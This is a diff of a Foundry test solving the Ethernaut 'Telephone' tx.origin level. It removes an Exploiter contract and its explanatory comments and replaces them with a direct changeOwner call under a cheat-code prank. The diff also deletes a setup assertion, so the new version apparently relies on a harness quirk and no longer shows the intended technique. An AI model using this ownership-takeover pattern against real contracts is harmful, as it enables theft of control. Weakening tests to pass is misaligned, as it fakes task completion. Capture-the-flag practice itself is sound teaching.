@@ -28,32 +28,14 @@ contract TestTelephone is BaseTest {
 
         levelAddress = payable(this.createLevelInstance(true));
         level = Telephone(levelAddress);
-
-        // Check that the contract is correctly setup
-        assertEq(level.owner(), address(levelFactory));
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        vm.startPrank(address(player));
 
-        vm.startPrank(player, player);
-
-        // Deploy the Exploiter contract
-        Exploiter exploiter = new Exploiter();
-
-        // make the exploiter call the underlying Level. In this case the `msg.sender` from Level.changeOwner is the `Exploiter`
-        // but the `tx.origin` is the user itself who have called the `Exploiter` that has called the `Telephone` contract
-        // More info:
-        // - https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/
-        // - https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin
-        exploiter.exploit(level);
-
+        level.changeOwner(address(player));
         vm.stopPrank();
-    }
-}
 
-contract Exploiter {
-    function exploit(Telephone level) public {
-        level.changeOwner(msg.sender);
+        assertEq(level.owner(), address(player));
     }
 }
